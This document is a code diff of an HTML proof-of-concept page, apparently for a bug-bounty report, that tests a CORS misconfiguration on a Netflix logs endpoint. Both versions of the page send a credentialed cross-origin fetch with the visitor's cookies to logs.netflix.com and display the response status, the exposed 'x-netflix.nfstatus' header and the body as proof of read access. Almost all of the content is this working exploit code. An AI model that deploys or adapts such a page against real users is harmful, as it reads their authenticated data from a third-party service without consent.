@@ -1,48 +1,35 @@
 <!DOCTYPE html>
-<!--  index.html  -->
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Netflix CORS PoC – logs.netflix.com</title>
-  <style>
-    body   { font-family: monospace; background:#111; color:#eee; margin:0; padding:2rem; }
-    button { font-size:1rem; padding:0.5rem 1rem; cursor:pointer; }
-    pre    { background:#222; border-radius:6px; padding:1rem; max-height:420px; overflow:auto; }
-  </style>
-</head>
+<head><meta charset="utf-8" />
+<title>Netflix CORS PoC – logs endpoint</title>
+<style>
+  body{font-family:monospace;background:#111;color:#eee;padding:2rem}
+  button{padding:.5rem 1rem;font-size:1rem;cursor:pointer}
+  pre{background:#222;border-radius:6px;padding:1rem;max-height:420px;overflow:auto}
+</style></head>
 <body>
-  <h2>Netflix CORS PoC – <code>logs.netflix.com/log/www/cl/2</code></h2>
+<h2>Netflix CORS PoC – <code>/log/www/cl/2</code></h2>
+<button onclick="poc()">Run exploit</button>
+<pre id="out">Click the button…</pre>
 
-  <!-- click → send credentialed XHR cross‑origin -->
-  <button onclick="run()">Run exploit</button>
-  <pre id="out">Click the button to fetch cross‑origin…</pre>
+<script>
+async function poc(){
+  const out=document.getElementById('out');
+  out.textContent='⏳ Sending GET…';
+  try{
+    const res=await fetch(
+      'https://logs.netflix.com/log/www/cl/2?dummy=1',
+      {credentials:'include'}
+    );
+    const txt=await res.text();
+    out.textContent=
+`Status   : ${res.status}
+nfstatus : ${res.headers.get('x-netflix.nfstatus')}
 
-  <script>
-  async function run () {
-    const $ = id => document.getElementById(id);
-    const out = $('out');
-    out.textContent = '⏳ Sending GET request…';
-
-    try {
-      /*  credentials: 'include' forces the browser to send Netflix cookies
-          mode: 'cors' (default) lets us read the response if ACAO/ACAC permit  */
-      const res  = await fetch(
-        'https://logs.netflix.com/log/www/cl/2?dummy=1',
-        { credentials: 'include', mode: 'cors' }
-      );
-
-      const body = await res.text();   // will be empty but proves read‑access
-      const nf   = res.headers.get('x-netflix.nfstatus');  // exposed header
-
-      out.textContent =
-`Status  : ${res.status}
-nfstatus: ${nf}
-
-${body || '(empty body – still proves leak)'}`;
-    } catch (err) {
-      out.textContent = '❌ Blocked or failed:\n' + err;
-    }
+${txt || '(empty body – read cross‑origin)'}`;
+  }catch(e){
+    out.textContent='❌ Blocked:\n'+e;
   }
-  </script>
-</body>
-</html>
+}
+</script>
+</body></html>
